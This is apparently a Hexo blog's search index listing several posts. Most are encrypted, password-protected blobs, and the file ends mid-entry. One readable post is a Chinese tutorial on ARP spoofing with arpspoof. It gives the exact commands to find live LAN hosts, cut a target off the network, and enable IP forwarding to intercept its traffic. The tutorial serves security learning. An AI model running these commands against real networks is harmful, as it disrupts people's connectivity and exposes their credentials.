<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019年终总结</title>
    <url>/post/2019year-endsummary/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="3a428eff0325cc242c4da573a2b12c9531628c273e88990a5151c64084ee628a">19f565449d7dbf976660957c736a449243935dc54d7eb28c75cc9a32dc0320273a9585416f6fcc5ddba1f28201cd652972c41e604bbe00d8c01d2e80b7d88996d46062f8602cd44e0a36b2036ae3c67bdafc9f241d34febfd08f4a3d8f0b7f7dfa71a6616eac49a3ebf0b8db7bd0d9ef4e6c88a7c0acd2a580b60bd93e3a77a7412a6963693054b15b8f96aa460a126ec4da26709df9c8560f1b530e108eb3cb9018c486243e46fe2b4aafecd8bfcc6d878942a982851978ed601edf0937ce466f71246de197e1b20a53a32140ba7b2276ffde917d09a66505aba4fc24facc857610cc79ce84b2ed2c802880eae12b9e6cecacf08ae20e4b3e3edc4e1cc2b29b564501c1407fe7d1b65b41961d83759d26bc4e9ac750086ae482f070d1b437e2ac5e52bc34cd3d00090235bd154ba3e533ad6c80390f467cbf332d9bd459ab900c6cec8db82e05b7ef1201c110e2d8bd27a8768fc8dfcc7c5a97fae264839a5a9c555c98d12990db2da405be8389a7654aac43225be05ac1fe31f390f9c75dea4f612fe700174124db0c74636dd81ca57e633893b9bfbf987109a63c5857725cd6611a84fba5b085c2b30eb442158dc4344c9ed1928ce2816b01914d38468154acbf3aea4971b254c849f80cf80a0f6c8b6b8e275defc40fa244f7050391b12ae96aaeb9a98fb5189a894ba876ce52e60369668b5b96027975884795893a0c9b96b420995483cbd82fbf90b153c206ee165156eee4f2b64a7085071cb31104caa1777bce2457942444efe2cab5409a86ec26abbb5848077fb46b37af7fad01bbf068989c143871caef5c5d42543cf19d3408d4c44584eced2aa873628891ee152a98530e9a62692b4493798bfadac76e99b046a5a935c1be69acd8f206909c0b08dacfa924c5fdddac139ff6711ffcdedb9183ed6cab073eb179ad66de8bda1d7ee10bcdb10532bc33b3aded597fab17c261cbba55cc1da1d05c75951c03e550af8cae75676417d22eb91df16e80613d847fc6980eaf065d8db5b1035d9e9126c0f46aef070c321a1a046bb058e24110a13a6418ccf7c01789072a3019021420ce26304d16eff49a34541abc766d0852934562c9cb0154c60c5e50144ee21f72a3ac8330549ce2d9070b9bdc692f12091b57f28458708098c13354b65fff3d32523dd3ed3943697800a81f3a9bd83549180291b31a11c13619bdd7bc274c85ceb04d9f6056c7c7ed901a7ef7f64515c14bee964a803944e7683c5c02a9f9cb4f0ef6c965f5e684752b144066720d22f5f6771804ff20a0e713d6da08725268587244309bca1630ff85ddf5228cc5c12e7d7ec22c541e14dd8bf3a2be3c7db4c8c9d667a09465679c023bdb0f20c9810d9a6b9b43ed14ffb33e4d9ed89af942d6d4874e51e728d3726400fb99bcc003c1fd1d77e827455213f4dd6cc364b5dbe9b2bdec91d9c740a0ad7add3bf1a66c5f89c3a08580bca096387053800afe74466bcaa893e31358a97731ddb674e12d37fa3e09a5d98bcae3309ffb95cf79c76d0eb0bf7adaca2a60b5ce1896f7694d9ab5fe776f301adbb5c2e677dc35e1d02cc0ba0f0ad3f914f1541e9fc892d8d80af88c330bbaca0e34639560a9f9972921e717bc4193d81d00ef071ccb5b136768a4ddb51ea0829a938bf94f755a9fbaa77a6a228775f5acb88f94725069aa56a75755edb9ab0792e98ca0b61ea5f47030e71774040c13771f4a33567980cfaa31e741d247bb42ab0d0382f905a79a1fe3d4c570cb6b1741bd7f01910a30e43561b8b961f1c3d1208841f5f815ea60cc5720624c9eb67b9c13a6449f63ccf5f0b1806ea5b8fbfb4100c66c18d4bbe0f7e1da273c1c811d0fd1a95335cdf28900890a3be03d011d9cd0c7e1717fb45b4fa9e4a03000102d7a8eb0d88895b4264119a8037b3a1a3da1385c3c2436aaf3db3a4aab547d56e8c009a7111837d671c87cb742be31a4702da10ad67cc7bec92e61b2eae8d882e8f5f7762f7760b228772e7aef5f38cfbce8a56a0dc9b201c35c1a43315d52eb5c13f9c87460128d7926a55943c143dd15f4afce21fe7c55b80b09dac26d89622b1cdf5e989e13ecc70d32b1cc0a727f9a4e8752f4dd07e222d1572bc1c793b4fc540c9943eb86f621c28cfcee8d951d09e077f085d30ac3c02f35b6a05f06d43382f3a7c73d2dc70a29935423335b8bafb6b6472db31a04ad5842081c936da780a711f49761c2aa0edad9dc3b38fadba82fbb863d5298605d43756f4f6b4226af017efebc8b3e9c67140af12ec8314222176902cd67513ec54840b3be4af6e574feeaa7ea8edc7da9d7b1e940640a6c9a044a0357483e54edcfdee61100732e8dadb6055f15abcee8a061facc8d10cd266dea449cce331a80aaf6151dbc545e632d672502db9a1a935e536464e434d241125be7db8d1f7a67474c0c0ef52340bf262bd60203e54bd56fc81030efaee171aaf7025c0be0e26b206be016613733c05db24b97936e830b51838347057d868a7bf7429169ea56786145b59834733c00c43634be0f9aaef5921fa5ca3c684e88595e9023f121aafbfc6c5f4c58950e82b48f226a4c2fd0f0be8ab4c88cf56a26b486592466bb961e5d5e55da9832c4a4c49b9f32e3cbe5dd96e0cb27382d18cd3b7f1151187d081f50b9883ba44079474f57e0390f1465e7bbc0409b9c8ddd968d928b14ddbacd77bf8a2dcee3a849da4ab0a2454622b3df45bfa726a72d996e900d8625c88f5fd5bf03</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年终总结</title>
    <url>/post/2020year-endsummary/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7fc130174753968d896a50c7cc64ca95e4aad1837e7140a49585473bb6c047a0">05a5f002642f8fac3c6a7f82f2a054ab7d4f93444dd4d01be561c9566be46927022c81845cd4abab4d34a071c9912255b29adda87efbf920df3f5b215020628f6ea0ddf9434a4a2ab722297c4233fb119e3099d08b39b43261eaeabfc956b5a9a9375701fd0ab5e3b699f2300aedf225eaac604fbddfa3ccd751be1261f0a20a669d1a29782ec8165fe4a125f11406041795199ce2aaaebe3aad430329063f84143dfe8aedd2590289d6f63b52ddaffec1adf09b67d8c69a56eb449c53cc23d4ea7fadbce6d663dad73fad01e8f63941535a823acaba1913e130e3e28b4bd798681b84c155b4a45862682416d387e0a9c901c9ec832f347443026c81b6500e681bc74e896113adede7b717ac1b626aa4bd8c690b3d2faf8d40dc9979fd8e0f21bb624daf58acb9e51b3fa520f53cbe9036634df9ea0091256753cc09143cabe2290adee7f43c5c5e516673914a16943ce89257b879ea84577f6c285464a6a7337ca471baa7453ed2488c93f50410d00ee6cf9cfc2dfc7ccb8bc7d1b21afcd279bee7dea88d16bedcd049ab7833d8fb289d26ddf8e67d0dbd70700ef666a5eabe81a5743cb7f0539dfe3179a004d9f54e77314623cfb5f7686f5fc438973f0cb6f6e0c2e3013e8310a845682c922914850eda83abedf3915ad947fe27757e2ce044a6435f2a984502a67bae008bde314bebaaae8182c7c3c4b819b97d2ef18c15734a999b55c5526d8cdc7a9837c52c51a72ebc8d5c3e41fe76f23bde86cc265bb8a39bf0bfa583d5f981e0645692631ded369faf12e33accc083cbcd91fc69e386b92b42d57cacb817610d759bc86e4abc7fec8882b561ffa2a0e2709c8c87737d090aac56c51a9cdd4c662093c24c73ab8eb330d5ee2091e7aed4c4827214cddbd75fce15c8c870d827775eb144d36d593fc0ada86a5b6b74a71ecfaf848f07b585517f3d5393f35a89211c6b5d63ba8e4a95896937d8a7566a24da79b9db1f44131c56e2bc1044eeb800502e4a084c18dd465a9773af03bcc74c955532a470e6b34f50fabaf56d240b8362a6d838c7d87e7baa27555627308671c9a7a6747c6f95bc4b481f96c4982c0d69b3e3a0bb89f29d177a02b601d78b80960b9d0571bb233a867245b4fc5f59dc793b95a38d6c23969dbbf77f9b07af3afc8233668ddbcf1ae356bd5a98a484a6123eab1fc19bbbb20e4597df806a4c55b37f19512bef656952d8cdea77c0dd1f52c3847b1c41d63f6a87c0ebd19c555c3b6a19d06a963f1f6ad11419419b2328114ea234c9ae15de0990aed75b6be241db24f4d0a51e1a4306fbb973974b20ec350fbfa20179e6d314e23113ef4d71affbc0a43c18dd811dda430cb7457be58aa9fa14440f80275b1b910928b7698991647f5c637cadf2a445f176556b9fe25d770e0bc5fa88508d4a897b4f4ca8ff452fe62cc05bd82002e038b473a0bd8e38329dc9fcabe198f63a35168d46c41d9d0fd1d2e840b72ebe23733d832beb975c98ff15065b14f1a37fbcac9940c70f0c32d26ef89ac195b8dfc2e439e76c18e1d2220dceff49a9d080e6b3cd640fa621dc457c838ca89ced816883f4b212a99a44cbc64e1845ebb000364ae71d3cf4b801fc4e38a09e7c7df454bc248292a943130e292a42d084a0b582a71b1e3beaa3257fd5179aa16f546a246483194710998ba9d736f00fc2021936157556216b5e50059655b764912f23e4544188eeca10dd8735dd10e419154f1a9c9ed8b73c70bfa5c74f33f8326e1a206cc1cc0ba6b944dbddc9aa5960fa8cf13bc554bbcb7f54e075bd63c99ae49567c68a5d0a1cc66eded6afd959f1a482bfc4b496082df3cf9e05cc6b1e286a37114f4282b1b22934aea77c1e6f83c1174276110c62c1aa7b344c6b18d707ebe0abb13c5b39f63dd8f315120c136f85e18d65de96344cd226da884e3ca4619138614ef5daa32e9d3114215fec28196c54b4ba8c395ff67d2f395f2b745effab822b8b8d022f7e0034366c20a463b7fb2d128b776f9cc925dde0227fd36d90ccad8f78ac49efc269e5365de3f57bfb7b064491e59e75aa5074e350ea5d209ff5769db8b3383784fcdf1253b8ea4539e1d0f92459bdb5d8f8589ecc150f7008809d912626dd251c3e5b8ca00ddaa45893fc53dfc2699b74c0993aabc598873b13b317a28ae03af1949ef4b5d0e23d0fac5bb040f991642498b3ff79bee8d7b7e9376d83b366c9400aa71442143065b10e7cffb35330661434c52bcc940907a509a46dba17fe64e31c416b2fd7f58cfd02e218a45199aca3dfd92b6962608cd7e9da4d92c257715638c7a505215b47fa3800d51c0f5219601b22001ec364571b8b21a139a3602450df2c0624653d44542c5ef468d69d27003bfd1b1cb25f76e99652e59cacb50118d882ddc2b8392c27ed5e75987f5cd0809223e9605cdb8c992505396605fbad0cc396baa8768d9931b1f23a0cf99d5e4be477e779216963b26abe89cc88c62ed9d41a899a4c65bd8430550e472b39eeb750d6aa6f4f224092ddaa6344ca6ab0757382a3d019373e2ca07fe81db7fec27f623b825eade9fda25f1833f9d2ec4d873fdd5d86ad1eb4d2c9bee8b9c94b8fd93b11b9f0026a905f9a05eaf61a3270f41e222ec89784ae260848944ad98eeecdb8d3b18ba6cf070cd12da9d67b3f82016f37f7e74cda63227353473ebedff119cbe1cead2ce42126b90353f216a20025fb9591923acaa663d5df2b17a1c9f45e36da85fb5fcebac486469690d133af71aa3ff252a5fc8184eb8ec5de03004b5aa9471cb6de747a5b723cc21df01e27f650843f99d55745c47613fee92cad526c4ca5cb66b1956db2d711bdff94971db947b8adeab11246ba19324d774cf39b6b8a9d927e1c322ce7696078163f19b20886da3d3db672b3e3398ab1b77f004253ff045bfee361d79f092fcb2d9dcbd7a3ed6973a814104c3b9ab42953a6d9c18dc74dc9f84c6264401bfeff5f8279157053d710f8f55907fa7e1f43d49b0c3de617d53d5c8572c18d04644f96bf914d3dfaa154144c19e3072f471e093e98fbe4cd03216bdf1849d8b59b3369d68f1f572a486f043a00b712800016d83c02e0305bcaaffbc1530dec030371ca15de96561cbd6c8e1e315f3183689cbe880a9289322c13a34c1139daae5b34dc567b8059b12bc0db4739b7b98ad1cf2d6117f393d7647e191c6ee1e99270306d026cb1519948b4e67f744e0be82edd536926309c178344d5f27463305939261753214ff65feb7d4f5e5aed2778c8a45700363f537c95f37372dd1aad44a47a9b50e7a2359209c585cc2576cf31defe779b04839a4d6dd8c3d483f29656042a7a4b7cb30508c77d9b403498c1453bd88ac541238716809d8b39a61363c850b18a99b90cee22bb493120355a9ef1edd7334c687c06a874919321d0a0e9a789e23f85b56c7061a9f6ffc3ad7adaed6bf6ced12db02f73a8c3dcb8fbc18e855e017a09bfdf3b55c906bd6de98574986f227504c708d9659c14168c63ded2abefc1a341a651c73391685a5e633a0db80b472242f309491a3059fc6b9f9d0e1f10c88052bf65e93791009b83a57c2314c2ce6e943edc8a559f8f6ebadac4eb25a71e3d714c434c94cf4bcbfb8488d27c94a9821e538e9df34aa5b096c0621b26482386452d356696dbb60ae14c63502b00e980ae232c6f4da02ad52b5289f132288f3b3c09ce187951f16ad0bf389e90a2d2dcc1a8783c90cf8204955e</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《ARP欺骗断网攻击》</title>
    <url>/post/ARP-Broken-network/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof</strong><br><font face="楷体"><strong>什么是ARP?</strong></font></p>
<blockquote>
<blockquote>
<p>&emsp; ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的 低层协议，负责将某个IP地址解析成对应的MAC地址。<br><font face="楷体"><strong>什么是ARP欺骗?</strong></font><br>&emsp;从影响网络连接通畅的方式来看，ARP欺骗分为两种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。<br>&emsp;第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。<br>&emsp;实际上ARP欺骗是一种中间人攻击，攻击者通过毒化受害者的ARP缓存，将网关的MAC替换成攻击者的MAC，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等。</p>
</blockquote>
</blockquote>
<hr>
<hr>
<p><font face="楷体">特别提示：<br>1、arpspoof是“Dsniff网络嗅探工具包“其中的一个工具；<br>2、使用arpspoof前内核“IP转发”功能（或完成相同的功能程序，例如fragrouter）必须提前打开。</font><br>&nbsp;</p>
<h3 id="一、ARP断网攻击用法"><a href="#一、ARP断网攻击用法" class="headerlink" title="一、ARP断网攻击用法"></a>一、ARP断网攻击用法</h3><table><tr><td bgcolor=#D1EEEE>1.先ping目标主机，ping通的主机才能欺骗；
2.若是不知目标主机IP，那就先查看本机IP，比如本机是192.168.1.201；
3.可以用fping -asg 192.168.1.0/24查看局域网内所有存活的主机IP，推荐查看IP列表中存  活的IP，因为有的IP不能直接给出是存活的；
4.使用模板：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
即：arpspoof -i eth0 -t 192.168.1.201 192.168.1.1
5.如此就能使目标主机在ARP欺骗期间处于断网状态。</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">fping -asg 192.168.1.0/24</span><br><span class="line">ping 192.168.1.201</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.201 192.168.1.1</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>提示：<br>-i interface          指定要使用的接口。<br>-c own|host|both      指定范围own|host|both（自己|主机|两者）。<br>-t target             指定一台特定主机为ARP中毒（如果未指定，则为LAN上的所有主机）。<br>-r<br>host                  指定您希望拦截数据包的主机（通常是本地网关）。</p>
</blockquote>
</blockquote>
<p>&nbsp;</p>
<h3 id="二、开启流量转发"><a href="#二、开启流量转发" class="headerlink" title="二、开启流量转发"></a>二、开启流量转发</h3><p>使目标的IP流量经过我的网卡，进行IP流量转发，让目标主机正常上网：</p>
<table><tr><td bgcolor=#D1EEEE>1.ARP欺骗之前先开启流量转发，使用echo 1 > /proc/sys/net/ipv4/ip_forward
2.使用命令：cat /proc/sys/net/ipv4/ip_forward,显示1表示成功开启转发功能，0表示未
开启;
3.另开一个窗口：arpspoof -i eth0 -t 192.168.1.201 192.168.1.1进行欺骗；
4.若目标主机能正常上网，则流量转发成功，否则流量转发未成功；
5.本机（虚拟机）就被靶机当成网关了（即实际网关和攻击主机的物理地址一样）
</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.201 192.168.1.1</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>对称密码-分组密码</title>
    <url>/post/Block-Cipher/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="fcb44d91feefdccd8f6876a5fbe6c27126981e73dc650853585b65273c6eac05">c8a6ea5f1e651a923da793e6131165195edca5e224eb04f8de211bd01e36a458404a312c92f198af16b815cf746e31e418df468f332f57ad407065a720ab50332e0ded5d198e59f3dfae1048f687f80d15ffd98b3eae445161f61a30ebed7cefe136f594001d8878421f2dbb05a289f0148d053e58caf530f6bafda2ae5a83894bd56771d334877bf231dcac2ed0838aac6e7f0b481e0c9c45bae491ee91195b357c889d774f9b25b60dee6f4622cd30bfcf4d988502020f0a0266cb96b8999da42dd0977ba685fdf9436e245399806ee33a136420fc7f0b51a6d5918b211256ce5643ef407f383bf2aca73a54cce1f7a9c640fb661a23582f0cfea0dd8bb5a981e0cbe9b0538e7515063b6bde21cd4a3c57c3b0ed633d8e1217332103d9cc33791325046012ada96d0dcbdbefa4d6734db014ed2ec38b841cec964f60d82b55219af9c77f086680c646882c22c1d0f95bcff70e2ef64bde6e25e0daec05a9a5824d20fe674e623cc02fd4b8041728536b176f58681c9dc305faee00fa6e9af6c7a602d6654d8aa29691e68fc3a9767463c43a1dab90f69cf7f1b1f685d2c1d3e80f8ca43ce62e85a4f6f66c5d586cf2813a953421c850348777b76f3769cd4d040be181dc77db4cc42625504158d290f6660af6377ab95058db7a76772d87755b3bbc2f0f64883000ce405d2dd3d19a6cb6695f53e61fe572d02e076aabf60576f11f018f612ee97f40ba149945199c8f755bae9ac254c7106ae680531cdc281a7f946cc51bfb69ce839f45e25a20fd4b564f93e0e3012c1d508029ae73d4ff2c9dff99004853176f292b00bb55f28098f02f12311bd4a3ed60766e8bbac784d29c932120a7808999e029a26c3cd5f2728161fc8026413fcddb9369329c7fb031b5af32a345918e2f4d0618e978478fa8b1ddfc4ec0708224d8d668533196aa8ec4dfd37a0b73fd285155aa9216f905b8b816e3edf4ba4db116d136c376915cc6baeb755ddc88db4adc6a0a2d81fbdd7bf5199783c304efb4b6dade937d4494f7688483a3af6f12fa3db7302780b1b7895031caa7b32d48ff0c399763a212f5a16e8b527d98886ed4085e65efed20e003259593074eac7bfc96aeab993acc73f86d68b32b3701304ae77c51c9e2d3189d4948a0cf108ba31ff58af738e31b98e5d0e867f34e163c90397b392bedebfe4899068cf3bb6aadc5d3ed5b518bc53ae919b43d8cb1872e5211934917cf1411d4c763f6b4558d99b14a669814e015892814f9723d09e3a594a2fc989ba1e3fb721642672c59bf73b6d1ab2df9584f697cf2455890b87aef39c7645d9114f169329995be825b4b0e9cbe67db54d60e5551326993df3a4014ef61174cd1246d8248222c99c6f17ac0021e993704aee83dfd04e0eb7bcdda71b35799d6ad6a4dcb5e21cd7e19751971c58b706e986cdcc33465c86ae998d8757288085fbe024ea3f958b46e2a201c0d38d9df5e4a3767a4282b53bba009f11e8b1ac7c1cbacce42551bd9c37f42644c9985b8934468e03f3f77582b2d8163a184deae7853b4d61cd823081ff135239b4c1f0a814260bf977fc5d707e4768c1fb8152f207d7618666f15dac083eb835fa1c8a05dc9185a116c0cac788990e76e57ba2bc9f0f73b031be699de968d1c00325ba1335b71e27b077a4c9d119e1817a13480eef6dbe09cfcc090490c7c6d7e8a7e77e174d28cb59fa0976ff04ac6cb5b7fc7587e940bb36109fa2122d9be835f000635feba24ff03ec4198f528cb2a5ec2a811aa1ac48cb6573316159494a1569deb0ebbee41583802b511fa81f3e73c1026dc5123d4e24fe38dde0b774ba6994bb2d5f1839b6ba173471be07e111b97b454b71aa972d4ccc6f0cb4558dcd443cb179f50f305d3e9be0dcfd4edd70d3a7496d5da07d9f11c6157700d785a5385a1db58c86a1e6cae5e75691ab00e0009f76d72aa0837eb13165efaf5325eeea0537ff4c6939b98c09d94ec4b3d952b89b035ae78a402f296075e60ef94306b9ca142ab4960e6493575322d9eacd22eaa85bc7c2483820dbee654907540bb8f621b9cb26d519864a43ee634dcfe611ac3952171f6d375d7939a76d60fce07b7976ddfad7a1973b517e710e5ffa1ef65ab2fda72bdffa43b66c16f0bb0c7a4aa811b352562f023af2c487494dc434d911b9ad3d2456dcdf5fc84d60489cb979a914219505a611c258ede92ec13d7b2cf9caaf8c739b99473f02670c65c41f0961a50502cd4d5b7425c99dc1fdeff58abb984fbd0000d8696f1892865887d637ce39e4719f5bf3c6ddf8274999fba2bfc4462848eb2aac444f4bdddd8de58afaf0125e8816f44b25ea29b3eae09a5e99845ee1886aa2b8b4fcfea0ea9ee8b3b29f805350773fc92da1a4b8d4277c553c06c3739ef7130041bdd5d6543a69c96118daf0b4b2f544e07ac12653c26675e0d8dd861051a0e6d448206912e9f473ce44f074e08b72d9192f2a2f769e258db3e08aada1253751942df786a565bd3973658b71ccbb0036ebcc5973a55311d002864f401a7c2eb21427f03579d5b7714d7d7eaaaa82b426515a4ba6f2b189997714e5e9031ade2df4bbcef2242aeb9077e2cdb8cb6025d4aca0f5fe9b4f62549dd930b64e6064ca7c8c9a45528729e834e3a75c4fb039cd9b5f3d16dd7157edfc099463f29f934398006fd0a82367d1662d56bfdd4dc7e593062d73247819f4e958e091d0f60d926d72c063daf69772ffbf20441752a4ec3c12537bce423463192fcbac2a16571f94f7c11b123d8694b5fc04137c9be970cb5773a67046aa1aa70d919f9ee2ca4004581ab08659930325b9ba0780236b42cdf182281bcdbaf2a6cde5408c3a85dcf5ad00be6577c945852c4714358d95ee9a7332c06a5d56d906b4456a79780136b42319f1c7e271f29663399054a9ff2fd038eb01a379cd3d2f6955a60e62e46b67af28444ae7321c70b0b7428dc64f72e401d87baa5f5823711dba898894bee56602b6ba260dcdc3c2a3f12ce7ac1289112ff6a8a45365ace384b91cef58c1dd51c552f44c32621e89138989b77a87238829db753e5434fc2e9d82a7367485919dcae8e65f44d25783ad519b6710a05a4f479bb8f51a716d67aad46cff2e737e309e28b372636a6d657a7ae0604e8b812254105f6b760c64c5855107a51085b320033dfc78a22e2d17f051a3f05b3f890ff9d804b083ae9a4528de26cd59ffa9113bc9064afa33905e97a430f1659f48b77390a54c835bd3ce679811ff1e9ce2657d7c03fafa2fbef4862b57ff0f6598c5b2b34c9a9407bc4f3282986f9fc07a90f525d924d10c7f3e8e13007613701ed14f355aff8a4a0f6202bfadf570f8735f3de9122b9fbf4a41c47cd0190495bd9bf4c18f8818ef2757096a285c22b3d194cdc2f093d8c777917cd1a1f14c51596ca79067802d4e8a67d9ccf173bb5a210a10182f66327c9fff780f5a76487eb44c186af813f20ff3b8cb74e13f0b5eebbea624283e79cf4e76d03afda2eb58c382589beb9e502ca8b9cdb5ad4ecc00d218d2a6c5f3cb86db43dfb025d3307f7c35762c9167f719dbd85c529d6fb45a08ca84b372e90340bdcde2091a0095d2e234918321ec31a6a2dea23722fd04269f7a61e0c5e7be136ac61d75e67dc86021f27d5257c00581b46127f3b4f2ae96f52f0b51e65a4475684e44d25c5c5cbe243b358f9e025395bfd99ffb563cfd66905a5ef03a0755e3bc42271b699c9484106b29c14993eaf9e544a876a46dc1451be4e5070e0dd3cf469ca89f4f1deaa06d7378443da2dec4fa1ebb73213a06aef0cc66bf851e52b1b1b89c0c6429970ff0d2034ad244042c81f6b5e43f33b682cc218ac651dc7b5f4aa3e7bac18de8be25ac310528586fb7fd3bd6b6c561f6b21561160dd87cbcc2dfa4c67cc24a297e7332f1244ee0f954813cbdff4c37d13319278520ceefbda85fb5339b142be3ba26fee468f6715567d536474d7ecfd285f6bae959c4b96a6e05651d04b2474eec80bfd1978f873a40f5ddfb185fb0264bc299d5c9df547c9a71f69931005a20d4559cf90bf3a58c38384fa1a581d5b4170f598fdd5eb281793f53ea395cc9bcdcc456d41076ef426ba57d9d69d5b9a1b8d52db9294b4e6cac3d6b4245fa6ce39008feb7e27fba29a3f34c7237694766cb8550c3f6c66925bc8dd44a72fe3570aa51f24a0858e234e03200f9d7e0c75fad7717c1f21dd9bb3270ba2880ee099cae6dcb1787c54cc994cfd32805d66ec71b4cf7a9ca0371700dfbca29b95fd6566809fd7d4bf255e6d59b62ff19bec1a4e35bd30a4c56a08a65615c7afe3d2106861d602d9ac4796296170984ded3b3cb31bf36be676f0328169b43a2b7f1cdae987f1b2cecffc6fba7de6a47eab0fdaecc457894b8b798f4a02678f6b7a3b809e917d8be1dd9b60582befb2db17f795988220bcf95e8ddf38e2200990b73ec11965fea5f3fba2fa33588a5e51c42f2cefa779cc2bdac621941031d85f33365e128b2391a2f6d2b94f154c1e31f7de18a3c37a29e96cd405b284ddd1ea3095ba2cae12d3</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>分组密码</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Basic-knowledge</title>
    <url>/post/CTF-Basic-knowledge/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="64721349f613707e03eea89295e4d2d38453e4ffbd4fe0c35d8757a2fdbd0854"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SMB-Information-leakage</title>
    <url>/post/CTF-SMB-Information-leakage/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e739d26151d26c41fcc75783d06572dfb9e0cd81f7c1087c11b8ac521e2664ef"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSH私钥泄漏</title>
    <url>/post/CTF-SSH-private-key-leak/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f9ffbe3348717d16acb417cff29d9ca71b997815d889c162b7b30a6ab603cd4d">0a1ef49aeff01221d756ce64b9d98f7fe3925d18dae42fa50dba3f89f1a9b940c6a38692b694b58733aa172341a1723f7b136156301fa2c895581849aeee09fbe00a78a1d0b37cee970c824460f9ad7d104934488a2cd4ea9a412a710bd7f7f4275b79283ed454ca3e06994af4d4b28d95c8e2746129071d8f7fa3a106b1a8ada8546340e56f9b088a96185530804b0e018d7c7ec9ca4dfa6e79940547294c3f12f002986ab6ebfa0bb969e861c5a75937074cafd78e44e590f441da04b5168ea92627b048ed723afd686c1608b2ab831c20e853de0875a3c249c886c17e5fa0edaf8d3c3d2a0d9e8b91665be763935dde569ce4fdb8b1e1470373d3e4213d07d92a91d71f904709da468dd315c8a5d2d6e6c2156f8fee726d0606ba0fd8203ef20d59b9d1ebb5311b22991b3cec4150e2b1001bd57dac71b533523cb7c8109819ba0a5f84bc0fe9f1cf01a62686773d5c9da245c8d6913dbff2714ab887238e4b3bf480931b8646c0381094c95be4aa46d07459bbec38ce826f6ab6087117acfb592e12b0ce2ca8b9